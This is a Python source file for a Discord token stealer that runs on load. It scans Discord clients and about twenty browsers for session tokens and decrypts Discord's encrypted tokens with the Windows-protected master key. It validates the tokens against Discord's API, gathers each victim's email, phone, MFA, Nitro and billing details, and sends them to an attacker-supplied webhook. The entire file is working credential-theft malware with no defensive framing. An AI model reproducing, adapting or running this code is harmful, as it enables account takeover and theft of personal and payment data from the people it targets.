import requests, re, os, json
from json import loads, dumps
from datetime import datetime
from urllib.request import Request, urlopen
from base64 import b64decode
from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData
from re import findall, match

class token2Discord:
    def __init__(self):
        self.WEBHOOK = '%WEBHOOK%'
        self.embed = []
        self.tokens = []
        self.plats = []
        self._ROAMING = os.getenv('APPDATA')
        self._LOCAL = os.getenv('LOCALAPPDATA')
        self._PATHS = {
            'Discord': self._ROAMING + r'\\discord\\Local Storage\\leveldb\\',
            'Discord Canary': self._ROAMING + r'\\discordcanary\\Local Storage\\leveldb\\',
            'Lightcord': self._ROAMING + r'\\Lightcord\\Local Storage\\leveldb\\',
            'Discord PTB': self._ROAMING + r'\\discordptb\\Local Storage\\leveldb\\',
            'Opera': self._ROAMING + r'\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\',
            'Opera GX': self._ROAMING + r'\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\',
            'Chrome': self._LOCAL + r'\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
            'Chrome SxS': self._LOCAL + r'\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\',
            'Microsoft Edge': self._LOCAL + r'\\Microsoft\Edge\\User Data\\Default\\Local Storage\\leveldb\\',
            'Epic Privacy Browser': self._LOCAL + r'\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\',
            'Uran': self._LOCAL + r'\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\',
            'Yandex': self._LOCAL + r'\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Brave': self._LOCAL + r'\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Amigo': self._LOCAL + r'\\Amigo\\User Data\\Local Storage\\leveldb\\',
            'Torch': self._LOCAL + r'\\Torch\\User Data\\Local Storage\\leveldb\\',
            'Kometa': self._LOCAL + r'\\Kometa\\User Data\\Local Storage\\leveldb\\',
            'Orbitum': self._LOCAL + r'\\Orbitum\\User Data\\Local Storage\\leveldb\\',
            'CentBrowser': self._LOCAL + r'\\CentBrowser\\User Data\\Local Storage\\leveldb\\',
            '7Star': self._LOCAL + r'\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\',
            'Sputnik': self._LOCAL + r'\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\',
            'Vivaldi': self._LOCAL + r'\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\',
            'Iridium': self._LOCAL + r'\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\'
        }


    def main(self):
        # find tokens
        self.steal()
        self.tokens = [*set(self.tokens)]
        if len(self.tokens) > 0:
            # if tokens were found, validate all tokens
            for token in self.tokens:
                userData = self.validate(token)
                # if user data was found, extract data
                if userData != None:
                    platIndex = self.tokens.index(token)
                    username, discordId, phone, email, mfa, nitro, billing = self.extract(userData, token)
                    # construct message
                    message = {
                        "fields": [
                            {
                                "name": "[Token Snatched]",
                                "value": f"Token: {token} | Platform: {self.plats[platIndex]}",
                                "inline": True
                            },
                            {
                                "name": "User Information:",
                                "value": f"Email/Phone Number: {email}:{phone}\nNitro Subscription: {nitro}\nBilling: {billing}",
                                "inline": False
                            }
                        ],
                        "Victim": {
                            "name": f"{username}{discordId}"
                        }
                    }
                    self.embed.append(message)
                    # send data to discord
                    self.discordSend()

    def decryptToken(self, encrypted, key):
        try:
            iv = encrypted[3:15]
            payload = encrypted[15:]
            cipher = AES.new(key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload)
            decrypted_pass = decrypted_pass[:-16].decode()
            return decrypted_pass
        except Exception:
            return "Failed to decrypt token"

    def getKey(self):
        with open(self._ROAMING +'\\discord\\Local State', "r", encoding="utf-8", errors="ignore") as f:
            local_state = f.read()
        local_state = json.loads(local_state)

        master_key = b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]
        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
        return master_key

    def steal(self):
        for plateform, path in self._PATHS.items():
            if not os.path.exists(path):
                continue
            if not "discord" in path:
                for file_name in os.listdir(path):
                    if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
                        continue
                    for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                        for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                            for token in findall(regex, line):
                                self.tokens.append(token)
                                self.plats.append(plateform)
            else:
                if os.path.exists(self._ROAMING +'\\discord\\Local State'):
                    for file_name in os.listdir(path):
                        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
                            continue
                        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                            for y in findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line):
                                token = self.decryptToken(b64decode(y.split('dQw4w9WgXcQ:')[1]), self.getKey())
                                self.tokens.append(token)
                                self.plats.append(plateform)



    def validate(self, token):
        try:
            response = requests.get("https://discordapp.com/api/v6/users/@me", headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36', 'Content-Type': 'application/json', 'Authorization': token})
            if response.status_code == 200:
                userData = loads(response.text)
            else:
                userData = None
        except Exception:
            userData = None

        return userData

    def extract(self, userData, token):
        username = userData['username'] + '#' + userData['discriminator']
        discordId = userData['id']
        phone = userData['phone']
        email = userData['email']
        try:
            if userData['mfa_enabled']:
                mfa = "Enabled"
            else:
                mfa = "Disabled"
        except Exception:
                mfa = "Unknown"
        try:
            if userData['premium_type'] == 1:
                nitro = 'Nitro Classic'
            elif userData['premium_type'] == 2:
                nitro = 'Nitro Boost'
            else:
                nitro = 'Unknown/None'
        except BaseException:
                nitro = 'Unknown/None'

        billResponse = requests.get("https://discord.com/api/v6/users/@me/billing/payment-sources", headers={'Authorization': token}).json()
        if len(billResponse) > 0:
            try:
                for billing in billResponse:
                    if billResponse['type'] == 1:
                        billing = "Credit Card"
                    elif billResponse['type'] == 2:
                        billing = "<:paypal:973417655627288666>"
                    else:
                        billing = "Unknown"
            except Exception:
                billing = "Unknown/None"
        else:
                billing = 'Unknown/None'

        return username, discordId, phone, email, mfa, nitro, billing

    def discordSend(self):
        headers = {
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
        }
        webhook = {
            "content": "",
            "embeds": self.embed,
        }
        try:
            urlopen(Request(self.WEBHOOK, data=dumps(webhook).encode(), headers=headers))
        except Exception as msg:
            pass

grab = token2Discord()
grab.main()
